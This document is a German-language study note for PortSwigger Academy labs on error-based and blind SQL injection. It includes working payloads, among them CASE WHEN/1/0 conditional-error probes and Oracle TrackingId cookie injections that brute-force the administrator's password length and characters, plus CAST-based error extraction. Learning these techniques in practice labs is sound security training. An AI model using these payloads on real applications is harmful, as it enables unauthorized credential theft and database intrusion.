---
created:
  - "{{date: DD-MM-YYYY}} {{time}}"
aliases:
  - "Course Code:"
  - PSS-Portswigger-Academy
tags:
  - Course/
---
## Was ist Error-Based SQL-Injection

Wie der Name schon sagt, anhand von Fehlermeldungen lässt sich diverses Verhalten zwischen App und Datenbank nachvollziehen und ggf. ausnutzen
- Man provoziert einen DB-Fehler **nur dann**, wenn eine getestete Bedingung zutrifft
	- Man verpackt die Bedingung in eine Ausdrucksform die bei True einen Fehler verursacht(z. B. Division durch Null)

Das könnte man dann wie folgt aufbauen:
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Hier sehen wir das Ergebnis wenn unser Input false ist![[ERROR_BASED_SQLI1.png]]Hier sehen wir das Ergebnis wenn unser Input true ist![[ERROR_BASED_SQLI2.png]]

In diesem Fall benutzen wir den 'CASE' Aufruf
- In dem ersten Fall evaluieren wir zu a weil Ergebnis false
- In dem zweiten Fall evaluieren wir zu Error weil macht `1/0` und wir können nicht durch 0 teilen

Und dann kann man Anfragen wie folgt bauen:
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

## Lab: Blind SQL injection with conditional errors(Oracle)

##### Passwortlänge herausfinden -> Im Intruder dann bruteforcen
```sql
TrackingId=EVe4hpFzFe2H0qvD' AND (SELECT CASE WHEN (LENGTH(password) > §20§) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--;
```

##### Passwort brute-forcen
```sql
TrackingId=EVe4hpFzFe2H0qvD' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) < 'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--;
```

Jetzt setzen wir folgendes PAYLOAD zusammen und bruteforcen jeden einzelnen Character![[ERROR_BASED_SQLI3.png]]Unser Turbo-Intruder liefert uns folgendes Ergebnis.![[ERROR_BASED_SQLI4.png]]


###  Auslegen von Daten durch Fehlernachrichten
 Gelegentlich kann auch die Fehlermeldung sensible Daten aus der tatsächlichen Abfrage enthalten.

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Diese Meldung zeigt die gesamte Abfrage, die die Anwendung aus den Eingaben konstruiert hat.
Dadurch lässt sich das Verhalten zwischen App und DB auch nochmal besser begutachten.
Das verwandelt die sonst blinde injection in eine visible injection.

Mit der `CAST()` Funktion können wir Datentypen in einen anderen konvertieren.
z. B.

```sql
CAST((SELECT example_column FROM example_table) AS int)
```
Oft sind die zu lesenden Daten Zeichenketten (Strings). Wenn du versuchst, diese in einen inkompatiblen Datentyp wie `int` zu konvertieren, kann das einen Fehler wie den folgenden erzeugen:

```sql
ERROR: invalid input syntax for type integer: "Example data"
```
Solche Abfragen sind außerdem nützlich, wenn ein Limit der Zeichenlänge verhindert, dass du konditionale Antworten (true/false) auslösen kannst - ein Fehler mit eingebettetem Inhalt kann dann die einzige Möglichkeit zur Datenexfiltration sein.


## Lab: Visible error-based SQL injection